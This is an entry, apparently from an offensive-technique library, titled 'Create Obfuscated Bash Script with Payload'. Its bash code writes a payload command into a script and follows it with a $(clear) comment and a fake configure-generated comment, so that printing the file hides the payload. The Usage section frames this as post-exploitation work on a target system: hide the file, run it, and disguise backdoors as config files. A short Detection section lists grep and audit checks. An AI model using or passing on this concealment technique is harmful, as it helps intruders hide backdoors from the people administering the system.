---
id: fbd53fd2-70ed-480f-9b04-6bd959ded9ed
name: create-obfuscated-bash-script-with-payload
type: code
language: bash
verified: true
created_at: '2023-04-06T03:56:17.743017+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - obfuscation
  - payload
  - evasion
validated: true
---

# Create Obfuscated Bash Script with Payload

## Code

```bash
echo "sneaky-payload-command" > script.sh
echo "# $(clear)" >> script.sh
echo "# Do not remove. Generated from /etc/issue.conf by configure." >> script.sh

# When printed, the terminal will be cleared and only the last line will be visible:
cat script.sh
```

## Description

This Bash code generates a script file that embeds a malicious payload command, followed by a clear screen invocation and a benign-looking comment. When the script is executed or viewed, the clear hides prior content, making the payload less obvious.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| sneaky-payload-command | The hidden malicious command | whoami > /tmp/secret.txt |
| script.sh | Name of the output script file | .hidden_script.sh |

## Usage

Execute this code in a shell on the target Linux system to create the obfuscated script. Then, rename to a hidden file (mv script.sh .script.sh) and execute with bash .script.sh to run the payload. Useful in post-exploitation for storing backdoors disguised as config files.

## Detection

- Monitor for echo commands creating scripts with clear or unusual comments via bash history or audit logs.
- Scan for files with $(clear) in content using grep -r "\$(clear)" /home/.
- Behavioral detection: Unusual terminal clears during script execution; file creation in hidden dirs.

## Related

- [[procedures/hide-artifacts-using-hidden-files-and-obfuscated-scripts-on-linux]]
